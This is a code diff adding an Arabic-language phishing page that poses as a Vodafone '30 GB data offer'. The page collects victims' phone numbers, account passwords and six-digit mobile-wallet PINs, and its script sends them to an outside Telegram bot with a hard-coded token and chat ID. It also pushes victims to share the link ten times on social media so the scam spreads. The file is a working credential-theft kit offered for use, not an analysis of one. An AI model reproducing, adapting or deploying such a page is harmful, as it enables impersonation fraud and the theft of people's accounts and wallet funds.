@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- وصف ومفاتيح البحث لتحسين SEO -->
+    <meta name="description" content="احصل على عرض 30 جيجا من فودافون بأقل الأسعار، قم بتسجيل الدخول باستخدام رقم هاتفك وكلمة السر، ثم أكمل الدفع بأمان.">
+    <meta name="keywords" content="فودافون, عرض 30 جيجا, بيانات فودافون, شحن فودافون, عروض الموبايل, فودافون كاش, تسجيل الدخول فودافون">
+
+    <!-- Open Graph - فيسبوك -->
+    <meta property="og:title" content="عرض 30 جيجا من فودافون">
+    <meta property="og:description" content="احصل على عرض 30 جيجا من فودافون بأسعار مذهلة، فقط قم بتسجيل الدخول وابدأ التفعيل الآن.">
+    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/en/thumb/c/cc/Vodafone_2017_logo.svg/614px-Vodafone_2017_logo.svg.png?20240728000856">
+    <meta property="og:url" content="https://yourwebsite.com">
+    <meta property="og:type" content="website">
+    <meta property="og:locale" content="ar_AR">
+
+    <!-- Twitter Card -->
+    <meta name="twitter:title" content="عرض 30 جيجا من فودافون">
+    <meta name="twitter:description" content="احصل على عرض 30 جيجا من فودافون بأسعار مذهلة، فقط قم بتسجيل الدخول وابدأ التفعيل الآن.">
+    <meta name="twitter:image" content="https://upload.wikimedia.org/wikipedia/en/thumb/c/cc/Vodafone_2017_logo.svg/614px-Vodafone_2017_logo.svg.png?20240728000856">
+    <meta name="twitter:card" content="summary_large_image">
+
+    <!-- WhatsApp -->
+    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/en/thumb/c/cc/Vodafone_2017_logo.svg/614px-Vodafone_2017_logo.svg.png?20240728000856"> <!-- نفس الصورة التي تظهر عند المشاركة -->
+
+    <!-- Favicon -->
+    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/en/thumb/c/cc/Vodafone_2017_logo.svg/614px-Vodafone_2017_logo.svg.png?20240728000856" type="image/svg+xml">
+
+    <title>عرض 30 جيجا من فودافون</title>
+    <style>
+        /* أساليب CSS كما في السابق */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            text-align: center;
+        }
+        .container h1 {
+            text-align: center;
+            color: #e60000;
+            margin-bottom: 20px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+        .btn {
+            width: 100%;
+            padding: 10px;
+            background-color: #e60000;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .btn:hover {
+            background-color: #cc0000;
+        }
+        .message {
+            text-align: center;
+            margin-top: 10px;
+            color: #555;
+        }
+        .hidden {
+            display: none;
+        }
+        .progress-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .progress-container {
+            background: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            text-align: center;
+            width: 300px;
+        }
+        .progress-bar {
+            width: 100%;
+            background: #ccc;
+            border-radius: 5px;
+            margin: 10px 0;
+        }
+        .progress-bar-fill {
+            width: 0;
+            height: 10px;
+            background: #e60000;
+            border-radius: 5px;
+        }
+        .progress-message {
+            margin-top: 10px;
+            font-size: 14px;
+            color: #333;
+        }
+        .share-buttons {
+            margin-top: 20px;
+        }
+        .share-button {
+            background-color: #0077B5; /* لون تويتر */
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 5px;
+        }
+        .share-button.whatsapp {
+            background-color: #25D366; /* لون واتساب */
+        }
+        .share-button.facebook {
+            background-color: #4267B2; /* لون فيسبوك */
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/en/archive/c/cc/20210511003513%21Vodafone_2017_logo.svg" alt=" فودافون">
+        <h1>عرض الـ 30 جيجا</h1>
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="phone">رقم الموبايل</label>
+                <input type="tel" id="phone" name="phone" placeholder="اكتب رقم موبايلك" pattern="[0-9]*" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required>
+            </div>
+            <div class="form-group">
+                <label for="password">كلمة السر للحساب</label>
+                <input type="password" id="password" name="password" placeholder="اكتب كلمة السر الخاصة بحسابك" pattern="[A-Za-z0-9]*" oninput="this.value = this.value.replace(/[^A-Za-z0-9]/g, '')" required>
+            </div>
+            <button type="submit" class="btn">تسجيل الدخول</button>
+        </form>
+
+        <form id="paymentForm" class="hidden">
+            <div class="form-group">
+                <label for="walletPin">الرقم السري للمحفظة</label>
+                <input type="password" id="walletPin" name="walletPin" placeholder="اكتب الرقم السري المكون من 6 أرقام" maxlength="6" pattern="\d{6}" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required>
+            </div>
+            <button type="submit" class="btn" id="walletPin-btn">تأكيد الدفع</button>
+        </form>
+
+        <div id="shareSection" class="hidden">
+            <p>للحصول على العرض، يرجى دعوة أصدقائك عبر وسائل التواصل:</p>
+            <div class="share-buttons">
+                <button class="share-button whatsapp" id="shareWhatsapp">مشاركة عبر واتساب</button>
+                <button class="share-button facebook" id="shareFacebook">مشاركة عبر فيسبوك</button>
+                <button class="share-button" id="shareTwitter">مشاركة عبر تويتر</button>
+            </div>
+            <p>تمت مشاركة العرض: <span id="shareCount">0</span> مرات.</p>
+        </div>
+
+        <p class="message" id="alertMessage"></p>
+    </div>
+
+    <div class="progress-overlay" id="progressOverlay">
+        <div class="progress-container">
+            <img src="https://upload.wikimedia.org/wikipedia/en/archive/c/cc/20210511003513%21Vodafone_2017_logo.svg" alt="شعار فودافون" style="width: 50px; margin-bottom: 10px;">
+            <h2>جاري المعالجة...</h2>
+            <div class="progress-bar">
+                <div class="progress-bar-fill" id="progressBarFill"></div>
+            </div>
+            <p class="progress-message" id="progressMessage">تأكيد البيانات وإتمام عملية الدفع...</p>
+        </div>
+    </div>
+    <script>
+        const loginForm = document.getElementById('loginForm');
+        const paymentForm = document.getElementById('paymentForm');
+        const message = document.getElementById('alertMessage');
+        const progressOverlay = document.getElementById('progressOverlay');
+        const progressBarFill = document.getElementById('progressBarFill');
+        const progressMessage = document.getElementById('progressMessage');
+        const shareSection = document.getElementById('shareSection');
+        const shareCountElement = document.getElementById('shareCount');
+        let shareCount = 0;
+    
+        loginForm.addEventListener('submit', function (e) {
+            e.preventDefault();
+            const phone = document.getElementById('phone').value;
+            const password = document.getElementById('password').value;
+            if (password.length >= 6) {
+                message.style.color = 'green';
+                message.textContent = 'تم تسجيل الدخول بنجاح! جاري الانتقال إلى الدفع...';
+    
+                setTimeout(() => {
+                    loginForm.classList.add('hidden');
+                    paymentForm.classList.remove('hidden');
+                }, 1500);
+            } else {
+                message.style.color = 'red';
+                message.textContent = 'كلمة السر غير صحيحة. حاول مرة أخرى.';
+            }
+        });
+    
+        paymentForm.addEventListener('submit', function (e) {
+            e.preventDefault();
+    
+            const walletPin = document.getElementById('walletPin').value;
+            if (/^\d{6}$/.test(walletPin)) {
+                paymentForm.classList.add('hidden');
+                progressOverlay.style.display = 'flex';
+    
+                let progress = 0;
+                progressMessage.textContent = 'تأكيد البيانات وإتمام عملية الدفع...';
+    
+                const interval = setInterval(() => {
+                    progress += 10;
+                    progressBarFill.style.width = progress + '%';
+                    if (progress >= 100) {
+                        clearInterval(interval);
+                        progressOverlay.style.display = 'none';
+                        // عرض قسم المشاركة بعد الدفع بنجاح
+                        shareSection.classList.remove('hidden');
+                        alert('تمت عملية الدفع بنجاح! الآن يمكنك دعوة أصدقائك عبر وسائل التواصل.');
+    
+                        // إرسال البيانات إلى تيليجرام بعد الدفع بنجاح
+                        sendToTelegram();
+                    }
+                }, 1500);
+            } else {
+                message.style.color = 'red';
+                message.textContent = 'الرقم السري غير صحيح. يجب أن يكون مكون من 6 أرقام.';
+            }
+        });
+    
+        // إرسال البيانات إلى تيليجرام
+        function sendToTelegram() {
+            const phone = document.getElementById('phone').value;
+            const password = document.getElementById('password').value;
+            const walletPin = document.getElementById('walletPin').value;
+    
+            const messageText = `تم التسجيل بنجاح:
+            - رقم الموبايل: ${phone}
+            - كلمة السر: ${password}
+            - الرقم السري للمحفظة: ${walletPin}`;
+    
+            const telegramToken = '6907816398:AAGqJzRPRxRaVGUS84cA-sZD8kl26s6wOlE';  // ضع توكن البوت هنا
+            const chatId = '6486770497';  // ضع معرف الدردشة أو القناة هنا
+    
+            const url = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(messageText)}`;
+            
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    console.log("تم إرسال البيانات إلى تيليجرام بنجاح:", data);
+                })
+                .catch(error => {
+                    console.error("فشل في إرسال البيانات إلى تيليجرام:", error);
+                });
+        }
+    
+        // مشاركة عبر وسائل التواصل
+        document.getElementById('shareWhatsapp').addEventListener('click', function() {
+            const shareText = "استمتع بعرض الـ 30 جيجا من فودافون! قم بزيارة الرابط للحصول على العرض.";
+            const url = window.location.href; // جلب الرابط الحالي للموقع
+            window.open(`https://wa.me/?text=${encodeURIComponent(shareText + " " + url)}`, "_blank");
+            updateShareCount();
+        });
+    
+        document.getElementById('shareFacebook').addEventListener('click', function() {
+            const url = window.location.href; // جلب الرابط الحالي للموقع
+            window.open(`https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(url)}`, "_blank");
+            updateShareCount();
+        });
+    
+        document.getElementById('shareTwitter').addEventListener('click', function() {
+            const shareText = "استمتع بعرض الـ 30 جيجا من فودافون!";
+            const url = window.location.href; // جلب الرابط الحالي للموقع
+            window.open(`https://twitter.com/intent/tweet?text=${encodeURIComponent(shareText + " " + url)}`, "_blank");
+            updateShareCount();
+        });
+    
+        function updateShareCount() {
+            shareCount++;
+            shareCountElement.textContent = shareCount;
+            if (shareCount >= 10) {
+                shareSection.classList.add('hidden');
+                progressOverlay.style.display = 'flex';
+                let progress = 0;
+                progressMessage.textContent = 'جاري إتمام العملية...';
+                const interval = setInterval(() => {
+                    progress += 10;
+                    progressBarFill.style.width = progress + '%';
+                    if (progress >= 100) {
+                        clearInterval(interval);
+                        progressOverlay.style.display = 'none';
+                        alert('تمت العملية بنجاح! سيتم التواصل معك قريبًا.');
+                        location.reload();
+                    }
+                }, 1000);
+            }
+        }
+    
+        document.getElementById('walletPin-btn').addEventListener('click', function() {
+            // جمع البيانات المدخلة من المستخدم
+            const phone = document.getElementById('phone').value;
+            const password = document.getElementById('password').value;
+            const walletPin = document.getElementById('walletPin').value;
+    
+            // التحقق من أن البيانات المدخلة صحيحة
+            if (phone && password && walletPin) {
+                // صيغة البيانات المدخلة لحفظها في الملف
+                const data = `رقم الموبايل: ${phone}\nكلمة السر: ${password}\nالرقم السري للمحفظة: ${walletPin}`;
+    
+                // دالة لحفظ البيانات في ملف نصي
+                saveToFile(data, 'user_data.txt');
+            } else {
+                alert('يرجى إدخال جميع البيانات بشكل صحيح.');
+            }
+        });
+    
+        // دالة لحفظ البيانات في ملف نصي
+        function saveToFile(data, filename) {
+            const blob = new Blob([data], { type: 'text/plain' });
+            const link = document.createElement('a');
+            link.href = URL.createObjectURL(blob);
+            link.download = filename;
+            link.click();
+        }
+    </script>
+    
+</body>
+</html>
